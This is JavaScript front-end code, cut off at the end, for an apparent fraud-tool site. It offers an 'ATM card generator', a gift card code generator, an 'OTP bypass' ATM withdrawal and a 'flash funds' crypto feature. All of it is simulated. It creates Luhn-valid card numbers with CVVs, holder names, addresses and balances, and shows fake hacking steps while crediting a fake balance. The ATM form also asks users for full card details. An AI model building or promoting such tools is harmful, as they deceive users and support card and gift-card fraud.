function showAtmCardGenerationModal() {
    const modal = document.getElementById('atmCardGenerationModal');
    const title = document.getElementById('atmGenerationTitle');
    const provider = cardProviders[selectedCardProvider];

    title.textContent = `Generating ${provider.name} ${provider.tiers[selectedCardTier].name} Card...`;
    modal.style.display = 'block';

    // Start generation animation
    startAtmCardGeneration();
}

function startAtmCardGeneration() {
    const steps = document.querySelectorAll('#atmGenerationStatus .generation-step');
    const progressFill = document.getElementById('atmGenerationProgressFill');
    const progressText = document.getElementById('atmGenerationProgressText');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 3000 + 4000; // 4-7 seconds per step
    const totalDuration = stepDuration * totalSteps;

    // Progress text updates
    const progressMessages = [
        'Accessing bank databases...',
        'Scanning premium accounts...',
        'Bypassing security systems...',
        'Generating card credentials...',
        'Finalizing account details...',
        'Card generation complete!'
    ];

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            // Remove active from previous steps
            steps.forEach(step => step.classList.remove('active'));
            
            // Activate current step
            steps[currentStep].classList.add('active');
            
            // Update progress
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = progressMessages[currentStep] || 'Processing...';

            currentStep++;
        } else {
            clearInterval(stepInterval);
            
            // Show success
            setTimeout(() => {
                document.getElementById('atmCardGenerationModal').style.display = 'none';
                showGeneratedAtmCard();
            }, 1500);
        }
    }, stepDuration);
}

function showGeneratedAtmCard() {
    const modal = document.getElementById('generatedAtmCardModal');
    const virtualCard = document.getElementById('virtualAtmCard');
    const provider = cardProviders[selectedCardProvider];
    const tier = provider.tiers[selectedCardTier];

    // Generate realistic card details
    const cardNumber = generateCardNumber(selectedCardProvider);
    const expiryDate = generateCardExpiryDate();
    const cvv = generateCVV();
    const holderName = generateNigerianName();
    const balance = generateTierBalance(tier.balance);
    const bank = nigerianBanks[Math.floor(Math.random() * nigerianBanks.length)];
    const accountNumber = generateAccountNumber();
    const billingAddress = generateBillingAddress();

    virtualCard.innerHTML = `
        <div class="atm-card-3d">
            <div class="atm-card-front ${tier.color}">
                <div class="atm-card-chip">💳</div>
                <div class="atm-card-number">${formatCardNumber(cardNumber)}</div>
                <div class="atm-card-details">
                    <div class="atm-card-holder">
                        <div class="label">CARD HOLDER</div>
                        <div class="value">${holderName.toUpperCase()}</div>
                    </div>
                    <div class="atm-card-expiry">
                        <div class="label">VALID THRU</div>
                        <div class="value">${expiryDate}</div>
                    </div>
                </div>
                <div class="atm-card-provider">${provider.name.toUpperCase()}</div>
            </div>

            <div class="atm-card-back">
                <div class="atm-card-stripe"></div>
                <div class="atm-card-cvv-section">
                    <div class="atm-cvv-label">CVV</div>
                    <div class="atm-cvv-value">${cvv}</div>
                </div>
                <div style="margin-top: 20px; font-size: 0.8rem; line-height: 1.4;">
                    <p><strong>Bank:</strong> ${bank}</p>
                    <p><strong>Account:</strong> ${accountNumber}</p>
                    <p><strong>Balance:</strong> ₦${balance.toLocaleString()}</p>
                    <p><strong>Daily Limit:</strong> ₦${Math.floor(balance * 0.1).toLocaleString()}</p>
                </div>
                <div style="margin-top: 15px; padding-top: 10px; border-top: 1px solid rgba(255,255,255,0.2); font-size: 0.75rem; line-height: 1.3; color: rgba(255,255,255,0.8);">
                    <p><strong>Billing Address:</strong></p>
                    <p>${billingAddress.street}</p>
                    <p>${billingAddress.area}, ${billingAddress.city}</p>
                    <p>${billingAddress.state} ${billingAddress.zipCode}</p>
                    <p>Nigeria</p>
                </div>
                <div style="margin-top: 15px; font-size: 0.7rem; opacity: 0.7;">
                    <p>This card is property of ${bank}. If found, please return to any branch.</p>
                </div>
            </div>
        </div>
    `;

    modal.style.display = 'block';
    
    // Store card details for copying
    window.currentAtmCardDetails = {
        provider: provider.name,
        tier: tier.name,
        cardNumber: cardNumber,
        expiry: expiryDate,
        cvv: cvv,
        holderName: holderName,
        balance: balance,
        bank: bank,
        accountNumber: accountNumber,
        billingAddress: billingAddress
    };

    showNotification(`🎉 ${provider.name} ${tier.name} card generated successfully!`, 'success');
}

function generateCardNumber(provider) {
    const providerData = cardProviders[provider];
    let cardNumber = providerData.prefix;
    
    // Generate remaining 15 digits
    for (let i = 1; i < 16; i++) {
        if (i === 15) {
            // Calculate check digit using Luhn algorithm
            cardNumber += calculateLuhnCheckDigit(cardNumber);
        } else {
            cardNumber += Math.floor(Math.random() * 10);
        }
    }
    
    return cardNumber;
}

function calculateLuhnCheckDigit(cardNumber) {
    let sum = 0;
    let isEven = true;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return (10 - (sum % 10)) % 10;
}

function generateCardExpiryDate() {
    const now = new Date();
    const futureYear = now.getFullYear() + Math.floor(Math.random() * 5) + 2; // 2-7 years from now
    const month = Math.floor(Math.random() * 12) + 1;
    return `${month.toString().padStart(2, '0')}/${futureYear.toString().substring(2)}`;
}

function generateCVV() {
    return Math.floor(Math.random() * 900 + 100).toString();
}

function generateNigerianName() {
    const gender = Math.random() > 0.5 ? 'male' : 'female';
    const names = nigerianNames[gender];
    return names[Math.floor(Math.random() * names.length)];
}

function generateBillingAddress() {
    const addressTypes = ['lagos', 'abuja', 'port_harcourt', 'kano', 'others'];
    const selectedType = addressTypes[Math.floor(Math.random() * addressTypes.length)];
    const addresses = nigerianAddresses[selectedType];
    const selectedAddress = addresses[Math.floor(Math.random() * addresses.length)];
    
    return {
        street: selectedAddress.street,
        area: selectedAddress.area,
        city: selectedAddress.city,
        state: selectedAddress.state,
        zipCode: selectedAddress.zipCode,
        country: 'Nigeria',
        fullAddress: `${selectedAddress.street}, ${selectedAddress.area}, ${selectedAddress.city}, ${selectedAddress.state} ${selectedAddress.zipCode}, Nigeria`
    };
}

function generateTierBalance(balanceRange) {
    const min = balanceRange[0];
    const max = balanceRange[1];
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateAccountNumber() {
    let accountNumber = '';
    for (let i = 0; i < 10; i++) {
        accountNumber += Math.floor(Math.random() * 10);
    }
    return accountNumber;
}

function formatCardNumber(cardNumber) {
    return cardNumber.match(/.{1,4}/g).join(' ');
}

function copyAtmCardDetails() {
    const details = window.currentAtmCardDetails;
    if (!details) return;

    const textToCopy = `
${details.provider} ${details.tier} ATM Card

CARD DETAILS:
Card Number: ${details.cardNumber}
Expiry Date: ${details.expiry}
CVV: ${details.cvv}
Cardholder: ${details.holderName}

BANKING INFORMATION:
Bank: ${details.bank}
Account Number: ${details.accountNumber}
Available Balance: ₦${details.balance.toLocaleString()}
Daily Limit: ₦${Math.floor(details.balance * 0.1).toLocaleString()}

BILLING ADDRESS:
Street Address: ${details.billingAddress.street}
Area/Neighborhood: ${details.billingAddress.area}
City: ${details.billingAddress.city}
State: ${details.billingAddress.state}
ZIP Code: ${details.billingAddress.zipCode}
Country: Nigeria

Generated by Miles ATM Card Generator
Timestamp: ${new Date().toLocaleString()}

⚠️ For educational purposes only
    `.trim();

    navigator.clipboard.writeText(textToCopy).then(() => {
        showNotification('📋 Card details copied to clipboard!', 'success');
        
        // Visual feedback
        const copyBtn = document.getElementById('copyAtmCardBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function closeGeneratedAtmCard() {
    document.getElementById('generatedAtmCardModal').style.display = 'none';
    
    // Reset selections
    selectedCardProvider = null;
    selectedCardTier = null;
    
    // Reset UI
    document.querySelectorAll('.card-provider-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelectorAll('.card-tier-option').forEach(option => {
        option.classList.remove('selected');
    });
    
    document.getElementById('tierSelection').style.display = 'none';
    document.getElementById('cardGenerationControls').style.display = 'none';
    
    showNotification('Ready to generate another ATM card!', 'success');
}

// Gift Card Generator Functions
let selectedCardType = null;
let selectedCardPrice = null;

const cardBrands = {
    amazon: {
        name: 'Amazon',
        icon: '🛒',
        colors: ['#FF9900', '#146EB4'],
        prices: [25, 50, 100, 200, 500]
    },
    steam: {
        name: 'Steam',
        icon: '🎮',
        colors: ['#1b2838', '#2a475e'],
        prices: [20, 50, 100, 200]
    },
    apple: {
        name: 'Apple',
        icon: '🍎',
        colors: ['#007AFF', '#5856D6'],
        prices: [25, 50, 100, 200]
    },
    google: {
        name: 'Google Play',
        icon: '📱',
        colors: ['#4285F4', '#34A853'],
        prices: [25, 50, 100, 200, 500]
    },
    paypal: {
        name: 'PayPal',
        icon: '💳',
        colors: ['#0070BA', '#003087'],
        prices: [50, 100, 200, 500, 1000]
    },
    visa: {
        name: 'Visa',
        icon: '💰',
        colors: ['#1A1F71', '#FDB913'],
        prices: [100, 200, 500, 1000, 2000]
    }
};

function setupGiftCardListeners() {
    // Card type selection
    document.querySelectorAll('.card-type-option').forEach(option => {
        option.addEventListener('click', function() {
            selectCardType(this.dataset.type);
        });
    });

    // Generate button
    const generateBtn = document.getElementById('generateCardBtn');
    if (generateBtn) {
        generateBtn.addEventListener('click', generateGiftCard);
    }

    // Generated card modal actions
    const copyBtn = document.getElementById('copyCardBtn');
    const closeBtn = document.getElementById('closeCardBtn');

    if (copyBtn) {
        copyBtn.addEventListener('click', copyCardDetails);
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', closeGeneratedCard);
    }
}

function selectCardType(type) {
    selectedCardType = type;
    
    // Update UI
    document.querySelectorAll('.card-type-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelector(`[data-type="${type}"]`).classList.add('selected');

    // Show price selection
    showPriceOptions(type);
}

function showPriceOptions(cardType) {
    const priceSelection = document.getElementById('priceSelection');
    const priceGrid = document.getElementById('priceOptionsGrid');
    const brand = cardBrands[cardType];

    priceGrid.innerHTML = '';
    
    brand.prices.forEach(price => {
        const priceOption = document.createElement('div');
        priceOption.className = 'price-option';
        priceOption.dataset.price = price;
        priceOption.innerHTML = `
            <div class="price-value">$${price}</div>
            <div class="price-currency">USD</div>
        `;
        
        priceOption.addEventListener('click', function() {
            selectPrice(price);
        });
        
        priceGrid.appendChild(priceOption);
    });

    priceSelection.style.display = 'block';
    priceSelection.scrollIntoView({ behavior: 'smooth' });
}

function selectPrice(price) {
    selectedCardPrice = price;
    
    // Update UI
    document.querySelectorAll('.price-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelector(`[data-price="${price}"]`).classList.add('selected');

    // Show generation controls
    document.getElementById('generationControls').style.display = 'block';
    document.getElementById('generationControls').scrollIntoView({ behavior: 'smooth' });
}

function generateGiftCard() {
    if (!selectedCardType || !selectedCardPrice) {
        showNotification('Please select card type and price first', 'error');
        return;
    }

    showGiftCardGenerationModal();
}

function showGiftCardGenerationModal() {
    const modal = document.getElementById('giftCardGenerationModal');
    const title = document.getElementById('generationTitle');
    const brand = cardBrands[selectedCardType];

    title.textContent = `Generating ${brand.name} Gift Card...`;
    modal.style.display = 'block';

    // Start generation animation
    startGiftCardGeneration();
}

function startGiftCardGeneration() {
    const steps = document.querySelectorAll('.generation-step');
    const progressFill = document.getElementById('generationProgressFill');
    const progressText = document.getElementById('generationProgressText');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 3000 + 4000; // 4-7 seconds per step
    const totalDuration = stepDuration * totalSteps;

    // Progress text updates
    const progressMessages = [
        'Initializing secure connection...',
        'Scanning gift card databases...',
        'Analyzing premium card pools...',
        'Bypassing security protocols...',
        'Generating unique card codes...',
        'Finalizing card details...'
    ];

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            // Remove active from previous steps
            steps.forEach(step => step.classList.remove('active'));
            
            // Activate current step
            steps[currentStep].classList.add('active');
            
            // Update progress
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = progressMessages[currentStep] || 'Processing...';

            currentStep++;
        } else {
            clearInterval(stepInterval);
            
            // Show success
            setTimeout(() => {
                document.getElementById('giftCardGenerationModal').style.display = 'none';
                showGeneratedCard();
            }, 1500);
        }
    }, stepDuration);
}

function showGeneratedCard() {
    const modal = document.getElementById('generatedCardModal');
    const virtualCard = document.getElementById('virtualGiftCard');
    const brand = cardBrands[selectedCardType];

    // Generate realistic gift card details (not credit card details)
    const cardCode = generateCardCode(selectedCardType);
    const expiryDate = generateExpiryDate();
    const batchNumber = generateBatchNumber();
    const serialNumber = generateSerialNumber();
    const redeemUrl = generateRedeemUrl(selectedCardType);

    virtualCard.innerHTML = `
        <div class="gift-card-3d">
            <div class="gift-card-front">
                <div class="card-brand-header">
                    <div class="card-brand-logo">${brand.icon}</div>
                    <div class="card-brand-title">${brand.name}</div>
                    <div class="gift-card-label">GIFT CARD</div>
                </div>

                <div class="card-value-display">
                    <div class="card-value">$${selectedCardPrice}</div>
                    <div class="card-currency">USD</div>
                </div>

                <div class="gift-card-code-section">
                    <div class="code-label">Gift Card Code</div>
                    <div class="gift-card-code">${cardCode}</div>
                </div>

                <div class="gift-card-footer">
                    <div class="footer-item">
                        <span class="label">Expires:</span>
                        <span class="value">${expiryDate}</span>
                    </div>
                    <div class="footer-item">
                        <span class="label">Serial:</span>
                        <span class="value">${serialNumber}</span>
                    </div>
                </div>
            </div>

            <div class="gift-card-back">
                <div class="back-header">
                    <div class="card-brand-title">${brand.name}</div>
                    <div class="gift-card-label">GIFT CARD</div>
                </div>

                <div class="redeem-instructions">
                    <h4>How to Redeem:</h4>
                    <ol>
                        <li>Visit: ${redeemUrl}</li>
                        <li>Enter gift card code</li>
                        <li>Apply to your account</li>
                        <li>Start shopping!</li>
                    </ol>
                </div>

                <div class="card-details">
                    <div class="detail-row">
                        <span>Batch Number:</span>
                        <span>${batchNumber}</span>
                    </div>
                    <div class="detail-row">
                        <span>Generated:</span>
                        <span>${new Date().toLocaleDateString()}</span>
                    </div>
                </div>

                <div class="terms-notice">
                    <p>Terms and conditions apply. Not redeemable for cash. Valid only in supported regions.</p>
                </div>
            </div>
        </div>
    `;

    modal.style.display = 'block';
    
    // Store card details for copying
    window.currentCardDetails = {
        brand: brand.name,
        value: selectedCardPrice,
        code: cardCode,
        expiry: expiryDate,
        batch: batchNumber,
        serial: serialNumber,
        redeemUrl: redeemUrl
    };

    if (typeof showNotification === 'function') {
        showNotification(`🎉 ${brand.name} $${selectedCardPrice} gift card generated successfully!`, 'success');
    }
}

function generateCardCode(type) {
    const patterns = {
        amazon: () => generateAlphaNumeric(14, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'),
        steam: () => generateNumeric(5) + '-' + generateAlphaNumeric(5, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') + '-' + generateAlphaNumeric(5, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'),
        apple: () => generateAlphaNumeric(16, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'),
        google: () => generateAlphaNumeric(20, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'),
        paypal: () => generateNumeric(16),
        visa: () => '4' + generateNumeric(15) // Visa cards start with 4
    };

    return patterns[type] ? patterns[type]() : generateAlphaNumeric(16, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789');
}

function generateExpiryDate() {
    const now = new Date();
    const futureYear = now.getFullYear() + Math.floor(Math.random() * 3) + 2; // 2-5 years from now
    const month = Math.floor(Math.random() * 12) + 1;
    return `${month.toString().padStart(2, '0')}/${futureYear}`;
}

function generateBatchNumber() {
    return 'GC' + generateNumeric(8);
}

function generateSerialNumber() {
    return generateAlphaNumeric(12, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789');
}

function generateRedeemUrl(cardType) {
    const urls = {
        amazon: 'amazon.com/redeem',
        steam: 'store.steampowered.com/account/redeemwalletcode',
        apple: 'redeem.apple.com',
        google: 'play.google.com/redeem',
        paypal: 'paypal.com/gift-cards/redeem',
        visa: 'visa.com/gift-cards'
    };
    return urls[cardType] || 'retailer.com/redeem';
}

function generateNumeric(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += Math.floor(Math.random() * 10);
    }
    return result;
}

function generateAlphaNumeric(length, charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    return result;
}

function copyCardDetails() {
    const details = window.currentCardDetails;
    if (!details) return;

    const textToCopy = `
${details.brand} Gift Card - $${details.value} USD

Gift Card Code: ${details.code}
Redeem at: ${details.redeemUrl}
Expires: ${details.expiry}
Serial Number: ${details.serial}
Batch Number: ${details.batch}

Generated by Miles
Timestamp: ${new Date().toLocaleString()}

Instructions:
1. Visit the redemption URL
2. Enter the gift card code
3. Apply to your account
4. Enjoy your purchase!
    `.trim();

    navigator.clipboard.writeText(textToCopy).then(() => {
        showNotification('📋 Card details copied to clipboard!', 'success');
        
        // Visual feedback
        const copyBtn = document.getElementById('copyCardBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function closeGeneratedCard() {
    document.getElementById('generatedCardModal').style.display = 'none';
    
    // Reset selections
    selectedCardType = null;
    selectedCardPrice = null;
    
    // Reset UI
    document.querySelectorAll('.card-type-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelectorAll('.price-option').forEach(option => {
        option.classList.remove('selected');
    });
    
    document.getElementById('priceSelection').style.display = 'none';
    document.getElementById('generationControls').style.display = 'none';
    
    showNotification('Ready to generate another gift card!', 'success');
}

// ATM Card Withdrawal Functions
function setupAtmCardListeners() {
    const cardNumberInput = document.getElementById('atmCardNumber');
    const cardExpiryInput = document.getElementById('atmCardExpiry');
    const cardCvvInput = document.getElementById('atmCardCvv');
    const cardNameInput = document.getElementById('atmCardName');
    const cardBankSelect = document.getElementById('atmCardBank');
    const card3D = document.getElementById('atmCard3D');

    if (!cardNumberInput) return;

    // Card number formatting and display
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formattedValue;
        
        const display = document.getElementById('cardNumberDisplay');
        if (value.length > 0) {
            const masked = value.split('').map((digit, index) => {
                if (index < value.length - 4) return '•';
                return digit;
            }).join('');
            const formatted = masked.match(/.{1,4}/g)?.join(' ') || masked;
            display.innerHTML = `<span>${formatted}</span>`;
        } else {
            display.innerHTML = '<span>•••• •••• •••• ••••</span>';
        }
    });

    // Expiry date formatting
    cardExpiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
        
        const display = document.getElementById('cardExpiryDisplay');
        display.textContent = value || 'MM/YY';
    });

    // CVV input with card flip
    cardCvvInput.addEventListener('focus', function() {
        card3D.classList.add('flipped');
    });

    cardCvvInput.addEventListener('blur', function() {
        card3D.classList.remove('flipped');
    });

    cardCvvInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        e.target.value = value;
        
        const display = document.getElementById('cardCvvDisplay');
        if (value.length > 0) {
            display.textContent = value;
        } else {
            display.textContent = '•••';
        }
    });

    // Cardholder name
    cardNameInput.addEventListener('input', function(e) {
        const display = document.getElementById('cardHolderDisplay');
        display.textContent = e.target.value.toUpperCase() || 'YOUR NAME';
    });

    // Bank selection
    cardBankSelect.addEventListener('change', function(e) {
        const display = document.getElementById('cardBankDisplay');
        display.textContent = e.target.value || 'SELECT BANK';
    });

    // Check balance button
    document.getElementById('checkAtmBalanceBtn').addEventListener('click', checkAtmBalance);
    
    // Withdraw button
    document.getElementById('atmWithdrawBtn').addEventListener('click', processAtmWithdrawal);
}

function checkAtmBalance() {
    const cardNumber = document.getElementById('atmCardNumber').value.replace(/\s/g, '');
    const expiry = document.getElementById('atmCardExpiry').value;
    const cvv = document.getElementById('atmCardCvv').value;
    const name = document.getElementById('atmCardName').value;
    const bank = document.getElementById('atmCardBank').value;
    const resultDiv = document.getElementById('atmBalanceResult');

    if (!cardNumber || !expiry || !cvv || !name || !bank) {
        showNotification('Please fill in all card details', 'error');
        return;
    }

    if (cardNumber.length < 13) {
        showNotification('Invalid card number', 'error');
        return;
    }

    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
        showNotification('Invalid expiry date format (MM/YY)', 'error');
        return;
    }

    if (cvv.length < 3) {
        showNotification('Invalid CVV', 'error');
        return;
    }

    // Show loading
    const checkBtn = document.getElementById('checkAtmBalanceBtn');
    const originalText = checkBtn.textContent;
    checkBtn.textContent = '🔍 Checking...';
    checkBtn.disabled = true;

    setTimeout(() => {
        // Generate realistic balance
        const balance = generateAtmBalance(cardNumber, bank);
        
        resultDiv.className = 'balance-result success';
        resultDiv.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <span>✅ Card Verified</span>
                <span style="color: var(--success-green); font-weight: 700;">₦${balance.toLocaleString()}</span>
            </div>
            <div style="font-size: 0.85em; color: var(--text-muted); margin-top: 8px;">
                Account Type: ${getAccountType(cardNumber)} • Status: Active • Available Balance
            </div>
        `;
        resultDiv.style.display = 'block';

        // Show withdrawal section
        document.getElementById('atmWithdrawSection').style.display = 'block';
        document.getElementById('atmWithdrawAmount').max = Math.min(balance, 100000); // Max 100k per transaction

        showNotification(`💳 Card verified! Available: ₦${balance.toLocaleString()}`, 'success');

        checkBtn.textContent = originalText;
        checkBtn.disabled = false;
    }, 2500);
}

function generateAtmBalance(cardNumber, bank) {
    // Generate balance based on card number and bank
    const seed = parseInt(cardNumber.substring(0, 6));
    const bankMultiplier = {
        'Access Bank': 1.2,
        'GTBank': 1.5,
        'First Bank': 1.0,
        'UBA': 1.1,
        'Zenith Bank': 1.4,
        'Fidelity Bank': 1.3,
        'Union Bank': 0.9,
        'Sterling Bank': 1.1,
        'Stanbic IBTC': 1.6,
        'Ecobank': 1.0
    };

    const multiplier = bankMultiplier[bank] || 1.0;
    const baseAmount = (seed % 500000) + 50000; // 50k - 550k base
    return Math.floor(baseAmount * multiplier);
}

function getAccountType(cardNumber) {
    const firstDigit = cardNumber.charAt(0);
    switch (firstDigit) {
        case '4': return 'Visa';
        case '5': return 'Mastercard';
        case '3': return 'American Express';
        case '6': return 'Discover';
        default: return 'Debit Card';
    }
}

function processAtmWithdrawal() {
    const amount = parseFloat(document.getElementById('atmWithdrawAmount').value);
    const balance = parseInt(document.getElementById('atmBalanceResult').textContent.match(/N([\d,]+)/)[1].replace(/,/g, ''));

    if (!amount || amount <= 0) {
        showNotification('Please enter a valid amount', 'error');
        return;
    }

    if (amount > balance) {
        showNotification('Insufficient balance', 'error');
        return;
    }

    if (amount > 100000) {
        showNotification('Maximum withdrawal limit is N100,000 per transaction', 'error');
        return;
    }

    // Process withdrawal
    showAtmProcessingModal(amount);
}

function showAtmProcessingModal(amount) {
    // Create and show processing modal
    const modal = document.createElement('div');
    modal.className = 'modal';
    modal.innerHTML = `
        <div class="modal-content processing-modal">
            <h3>🏧 Processing ATM Withdrawal</h3>
            <div class="processing-steps">
                <div class="step active">🔐 Bypassing OTP verification...</div>
                <div class="step">💳 Accessing card database...</div>
                <div class="step">🏦 Connecting to bank servers...</div>
                <div class="step">💰 Authorizing withdrawal...</div>
                <div class="step">✅ Funds transferred successfully!</div>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="atmProgressFill"></div>
            </div>
        </div>
    `;

    document.body.appendChild(modal);
    modal.style.display = 'block';

    // Animate processing
    const steps = modal.querySelectorAll('.step');
    const progressFill = modal.querySelector('#atmProgressFill');
    let currentStep = 0;

    const interval = setInterval(() => {
        if (currentStep < steps.length) {
            steps.forEach(step => step.classList.remove('active'));
            steps[currentStep].classList.add('active');
            
            const progress = ((currentStep + 1) / steps.length) * 100;
            progressFill.style.width = progress + '%';
            
            currentStep++;
        } else {
            clearInterval(interval);
            
            setTimeout(() => {
                modal.remove();
                
                // Update balance and show success
                userSession.balance += amount;
                saveUserSession(userSession);
                updateBalance();

                showNotification(`💰 Successfully withdrew ₦${amount.toLocaleString()} from ATM!`, 'success');
                
                // Show receipt
                showAtmReceipt(amount);
            }, 1000);
        }
    }, 3000);
}

function showAtmReceipt(amount) {
    const cardNumber = document.getElementById('atmCardNumber').value;
    const bank = document.getElementById('atmCardBank').value;
    const name = document.getElementById('atmCardName').value;
    
    const transactionId = 'ATM' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const timestamp = new Date().toLocaleString();

    const receiptModal = document.createElement('div');
    receiptModal.className = 'modal';
    receiptModal.innerHTML = `
        <div class="modal-content receipt-modal">
            <h3>🏧 ATM Withdrawal Receipt</h3>
            <div class="receipt">
                <div class="receipt-header">ATM WITHDRAWAL RECEIPT</div>
                <div class="receipt-details">
                    <p><strong>Transaction Type</strong><span>ATM Withdrawal</span></p>
                    <p><strong>Card Number</strong><span>****${cardNumber.slice(-4)}</span></p>
                    <p><strong>Bank</strong><span>${bank}</span></p>
                    <p><strong>Cardholder</strong><span>${name.toUpperCase()}</span></p>
                    <p><strong>Amount</strong><span>₦${amount.toLocaleString()}</span></p>
                    <p><strong>Transaction ID</strong><span>${transactionId}</span></p>
                    <p><strong>Status</strong><span style="color: var(--success-green);">SUCCESS</span></p>
                </div>
                <div class="receipt-footer">
                    <p>Timestamp: ${timestamp}</p>
                    <p>Method: Bypass OTP • Fee: N0.00</p>
                </div>
            </div>
            <button onclick="this.parentElement.parentElement.remove(); showPage('dashboard');" class="close-receipt-btn">
                Close & Return to Dashboard
            </button>
        </div>
    `;

    document.body.appendChild(receiptModal);
    receiptModal.style.display = 'block';
}

// Flash Funds Functions
function setupFlashFundsListeners() {
    // Form inputs for real-time preview
    const targetWallet = document.getElementById('flashTargetWallet');
    const network = document.getElementById('flashNetwork');
    const crypto = document.getElementById('flashCrypto');
    const amount = document.getElementById('flashAmount');
    const duration = document.getElementById('flashDuration');

    if (targetWallet) {
        targetWallet.addEventListener('input', updateFlashPreview);
        network.addEventListener('change', updateFlashPreview);
        crypto.addEventListener('change', updateFlashPreview);
        amount.addEventListener('input', updateFlashPreview);
        duration.addEventListener('change', updateFlashPreview);
    }

    // Initiate flash button
    const initiateBtn = document.getElementById('initiateFlashBtn');
    if (initiateBtn) {
        initiateBtn.addEventListener('click', initiateFlashFunds);
    }

    // Receipt actions
    const copyReceiptBtn = document.getElementById('copyFlashReceiptBtn');
    const closeReceiptBtn = document.getElementById('closeFlashReceiptBtn');

    if (copyReceiptBtn) {
        copyReceiptBtn.addEventListener('click', copyFlashReceipt);
    }

    if (closeReceiptBtn) {
        closeReceiptBtn.addEventListener('click', closeFlashReceipt);
    }
}

function updateFlashPreview() {
    const targetWallet = document.getElementById('flashTargetWallet').value;
    const network = document.getElementById('flashNetwork').value;
    const crypto = document.getElementById('flashCrypto').value;
    const amount = document.getElementById('flashAmount').value;
    const duration = document.getElementById('flashDuration').value;




    // Update preview display
    document.getElementById('previewWallet').textContent = targetWallet ? 
        targetWallet.substring(0, 8) + '...' + targetWallet.substring(targetWallet.length - 8) : 
        'Not set';
    
    document.getElementById('previewNetwork').textContent = getNetworkName(network);
    document.getElementById('previewAmount').textContent = amount ? 
        `${amount} ${crypto}` : '0.00';
    
    document.getElementById('previewDuration').textContent = getDurationText(duration);
    document.getElementById('previewFee').textContent = calculateFlashFee(amount, network);
}

function getNetworkName(network) {
    const networks = {
        'eth': 'Ethereum',
        'bsc': 'Binance Smart Chain',
        'polygon': 'Polygon',
        'arbitrum': 'Arbitrum',
        'optimism': 'Optimism'
    };
    return networks[network] || 'Ethereum';
}

function getDurationText(seconds) {
    const durations = {
        '60': '1 Minute',
        '300': '5 Minutes',
        '600': '10 Minutes',
        '1800': '30 Minutes',
        '3600': '1 Hour',
        '7200': '2 Hours'
    };
    return durations[seconds] || '1 Minute';
}

function calculateFlashFee(amount, network) {
    if (!amount || amount <= 0) return '0.001 ETH';
    
    const baseFee = parseFloat(amount) * 0.02; // 2% base fee
    const networkFees = {
        'eth': 0.003,
        'bsc': 0.001,
        'polygon': 0.0005,
        'arbitrum': 0.0015,
        'optimism': 0.0012
    };
    
    const networkFee = networkFees[network] || 0.003;
    const totalFee = baseFee + networkFee;
    
    return `${totalFee.toFixed(4)} ETH`;
}

function initiateFlashFunds() {
    const targetWallet = document.getElementById('flashTargetWallet').value.trim();
    const network = document.getElementById('flashNetwork').value;
    const crypto = document.getElementById('flashCrypto').value;
    const amount = parseFloat(document.getElementById('flashAmount').value);
    const duration = document.getElementById('flashDuration').value;

    // Validation
    if (!targetWallet) {
        showNotification('Please enter target wallet address', 'error');
        return;
    }

    if (!/^0x[a-fA-F0-9]{40}$/.test(targetWallet)) {
        showNotification('Invalid wallet address format', 'error');
        return;
    }

    if (!amount || amount <= 0) {
        showNotification('Please enter a valid amount', 'error');
        return;
    }

    if (amount < 0.001) {
        showNotification('Minimum flash amount is 0.001', 'error');
        return;
    }

    // Store flash details
    window.currentFlashDetails = {
        targetWallet,
        network,
        crypto,
        amount,
        duration: parseInt(duration),
